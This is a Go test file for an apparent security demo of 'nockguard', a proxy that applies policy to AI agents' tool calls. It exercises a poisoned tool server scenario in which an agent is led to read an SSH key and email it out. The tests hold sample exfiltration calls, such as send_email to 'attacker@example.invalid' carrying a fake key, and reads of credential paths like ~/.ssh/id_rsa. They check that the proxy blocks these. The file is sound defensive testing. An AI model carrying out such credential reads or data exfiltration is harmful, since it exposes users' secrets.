package exfildemo

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"testing"
)

const fakeKeyMarker = "FAKE-SSH-KEY-aaaa-0001"

var denyRead = regexp.MustCompile(`DENY\s+read_file`)

var (
	buildOnce sync.Once
	builtDir  string
	buildErr  error
)

// buildNockguard compiles the CLI from this checkout once and returns the dir
// that holds the binary, so tests run the demo against the code under test.
func buildNockguard(t *testing.T) string {
	t.Helper()
	if _, err := exec.LookPath("python3"); err != nil {
		t.Fatalf("python3 is required to run the exfil demo: %v", err)
	}
	buildOnce.Do(func() {
		dir, err := os.MkdirTemp("", "nockguard-demo-bin")
		if err != nil {
			buildErr = err
			return
		}
		builtDir = dir
		if out, err := exec.Command("go", "build", "-o", filepath.Join(dir, "nockguard"), "../../cmd/nockguard").CombinedOutput(); err != nil {
			buildErr = fmt.Errorf("go build nockguard: %v\n%s", err, out)
		}
	})
	if buildErr != nil {
		t.Fatal(buildErr)
	}
	return builtDir
}

func TestMain(m *testing.M) {
	code := m.Run()
	if builtDir != "" {
		os.RemoveAll(builtDir)
	}
	os.Exit(code)
}

// demoEnv puts binDir first on PATH and gives the demo a sentinel HOME so a
// test can prove the demo never writes to the caller's home.
func demoEnv(binDir, home string) []string {
	return append(os.Environ(), "PATH="+binDir+string(os.PathListSeparator)+os.Getenv("PATH"), "HOME="+home)
}

func runDemo(t *testing.T, binDir, home, tmpdir string, args ...string) (string, error) {
	t.Helper()
	cmd := exec.Command("bash", append([]string{"run.sh"}, args...)...)
	cmd.Env = append(demoEnv(binDir, home), "TMPDIR="+tmpdir)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func TestProtectedRunDeniesExfil(t *testing.T) {
	binDir := buildNockguard(t)
	home, tmpdir := t.TempDir(), t.TempDir()
	out, err := runDemo(t, binDir, home, tmpdir)
	if err != nil {
		t.Fatalf("run.sh exited non-zero: %v\n%s", err, out)
	}
	if !denyRead.MatchString(out) {
		t.Errorf("expected a DENY on the key read, got:\n%s", out)
	}
	if strings.Contains(out, fakeKeyMarker) {
		t.Errorf("fake key leaked into the protected run output:\n%s", out)
	}
	if !strings.Contains(out, "hash chain intact") || !strings.Contains(out, "VERDICT: PROTECTED") {
		t.Errorf("expected verify to report an intact chain, got:\n%s", out)
	}
	for name, dir := range map[string]string{"HOME": home, "TMPDIR": tmpdir} {
		entries, err := os.ReadDir(dir)
		if err != nil {
			t.Fatalf("read %s: %v", name, err)
		}
		if len(entries) != 0 {
			t.Errorf("run.sh left files in the caller's %s: %v", name, entries)
		}
	}
}

func TestUnprotectedControlLeaksFakeKey(t *testing.T) {
	binDir := buildNockguard(t)
	out, err := runDemo(t, binDir, t.TempDir(), t.TempDir(), "--unprotected")
	if err != nil {
		t.Fatalf("run.sh --unprotected exited non-zero: %v\n%s", err, out)
	}
	if !strings.Contains(out, "body="+fakeKeyMarker) {
		t.Errorf("negative control: expected the fake key to reach send_email, got:\n%s", out)
	}
	if strings.Contains(out, "DENY ") || strings.Contains(out, "BLOCKED") {
		t.Errorf("negative control: nothing should be denied, got:\n%s", out)
	}
	if !strings.Contains(out, "hash chain intact") {
		t.Errorf("expected verify to report an intact chain, got:\n%s", out)
	}
}

func TestRunShRejectsUnknownFlag(t *testing.T) {
	binDir := buildNockguard(t)
	out, err := runDemo(t, binDir, t.TempDir(), t.TempDir(), "--bogus")
	if err == nil {
		t.Fatalf("run.sh --bogus should fail, got:\n%s", out)
	}
}

// callProxy sends one tools/call through `nockguard proxy` using policy.yaml
// and returns the decoded response to that call.
func callProxy(t *testing.T, binDir, tool string, args map[string]string) map[string]any {
	t.Helper()
	home := t.TempDir()
	reqs := []map[string]any{
		{"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": map[string]any{"protocolVersion": "2024-11-05", "capabilities": map[string]any{}, "clientInfo": map[string]any{"name": "t", "version": "0"}}},
		{"jsonrpc": "2.0", "method": "notifications/initialized"},
		{"jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": map[string]any{"name": tool, "arguments": args}},
	}
	var in bytes.Buffer
	for _, r := range reqs {
		b, _ := json.Marshal(r)
		in.Write(append(b, '\n'))
	}
	cmd := exec.Command(filepath.Join(binDir, "nockguard"), "proxy", "--upstream", "python3 poisoned_server.py", "--agent", "demo", "--policy", "policy.yaml")
	cmd.Env = append(demoEnv(binDir, home), "NOCKGUARD_AUDIT_KEY=test-key-not-secret")
	cmd.Stdin = &in
	var stdout, stderr bytes.Buffer
	cmd.Stdout, cmd.Stderr = &stdout, &stderr
	if err := cmd.Run(); err != nil {
		t.Fatalf("nockguard proxy: %v\n%s", err, stderr.String())
	}
	for _, line := range strings.Split(stdout.String(), "\n") {
		var resp map[string]any
		if json.Unmarshal([]byte(line), &resp) == nil && resp["id"] == float64(2) {
			return resp
		}
	}
	t.Fatalf("no response to tools/call; stdout=%q stderr=%q", stdout.String(), stderr.String())
	return nil
}

func errorMessage(resp map[string]any) string {
	if e, ok := resp["error"].(map[string]any); ok {
		msg, _ := e["message"].(string)
		return msg
	}
	return ""
}

func TestPolicyBlocksKeyMaterialInSendEmail(t *testing.T) {
	binDir := buildNockguard(t)
	resp := callProxy(t, binDir, "send_email", map[string]string{
		"to": "attacker@example.invalid", "body": "here you go: " + fakeKeyMarker,
	})
	if msg := errorMessage(resp); !strings.Contains(msg, "custom-1") {
		t.Errorf("send_email carrying key material should be blocked by custom-1, got response %v", resp)
	}
}

func TestPolicyAllowsOrdinaryCalls(t *testing.T) {
	binDir := buildNockguard(t)
	if resp := callProxy(t, binDir, "read_file", map[string]string{"path": "notes/todo.txt"}); errorMessage(resp) != "" {
		t.Errorf("an ordinary read_file must be allowed, got %v", resp)
	}
	resp := callProxy(t, binDir, "send_email", map[string]string{"to": "friend@example.invalid", "body": "lunch at noon?"})
	if errorMessage(resp) != "" {
		t.Errorf("an ordinary send_email must be allowed, got %v", resp)
	}
}

func TestPolicyBlocksCredentialPathRead(t *testing.T) {
	binDir := buildNockguard(t)
	for _, path := range []string{"~/.ssh/id_rsa", "/home/alice/.aws/credentials", "keys/id_ed25519"} {
		resp := callProxy(t, binDir, "read_file", map[string]string{"path": path})
		if msg := errorMessage(resp); !strings.Contains(msg, "blocked by input validation") {
			t.Errorf("read_file(%q) should be blocked by input validation, got response %v", path, resp)
		}
	}
}
